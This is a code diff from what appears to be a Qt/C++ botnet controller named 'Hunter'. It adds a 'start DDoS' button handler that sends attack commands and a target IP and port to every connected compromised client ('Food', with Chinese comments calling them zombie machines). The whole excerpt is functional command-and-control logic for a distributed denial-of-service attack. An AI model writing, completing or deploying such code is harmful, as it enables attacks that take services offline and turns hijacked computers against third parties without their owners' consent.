@@ -241,6 +241,40 @@ Hunter::Hunter(QWidget *parent)
         }
     });
 
+    // 启动ddos模块
+    connect(ui->btDDos, &QPushButton::clicked, this, [=](){
+
+        int id = ui->tableOnline->rowCount();
+        if (id != 0)
+        {
+
+            Ddos *ds = new Ddos();
+            QString IP = ds->getIP();
+            int PORT = ds->getPORT();
+            qDebug()<<IP<<PORT;
+
+            for(int ddosid=1 ; ddosid <= id ; ddosid++)
+            {
+                DdosATK *dk= new DdosATK();
+                Food *food = mCook->getFoodById(ddosid);
+                //返回模块专用端口(用于发送命令)
+                int port = dk->startDdosATKServer();
+
+                //开始DDOS
+                food->sendCmdDdos(port);
+                //发送攻击目标IP和端口
+                dk->sendCommand(IP,PORT);
+                //断开客户？？？？
+                food->closeAndDelete();
+            }
+        }
+        else
+        {
+            QMessageBox::information(this,"Fail","尊敬的主人，DDOS需要食物呀");
+            qDebug() << "DDOS 需要肉鸡的,亲";
+        }
+    });
+
     // ----------------------------------------按键与对应逻辑（完毕）--------------------------------------------------
 
 
